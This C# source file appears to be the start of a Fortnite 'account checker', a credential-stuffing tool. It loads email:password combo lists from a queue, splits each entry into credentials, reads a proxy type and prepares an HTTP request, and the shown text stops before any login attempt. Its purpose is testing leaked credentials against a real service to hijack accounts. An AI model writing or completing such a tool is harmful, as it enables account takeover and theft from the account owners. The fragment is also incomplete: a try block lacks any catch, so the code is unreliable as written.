using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using xNet;

namespace Fortnite
{
    internal class Check
    {
        public static ConcurrentQueue<string> Combos = Tools.Combos;
        public static void Checking()
        {
            for (; ; )
            {
                try
                {
                    if (Combos.Any<string>() == false) { Thread.Sleep(-1); }

                    string Account;
                    string Proxy;
                    string ProxyType = Tools.ProxyType;

                    Combos.TryDequeue(out Account);

                    var Email = Account.Split(new char[] { ':', ';', '|' })[0];
                    var Password = Account.Split(new char[] { ':', ';', '|' })[1];
                    var User = Email.Contains("@") ? Email.Split('@')[0] : Email;

                    HttpRequest httpReq = new HttpRequest();

                    httpReq.SslCertificateValidatorCallback += (obj, cert, ssl, error) => (cert as X509Certificate2).Verify();
                }
            }
        }
    }
}
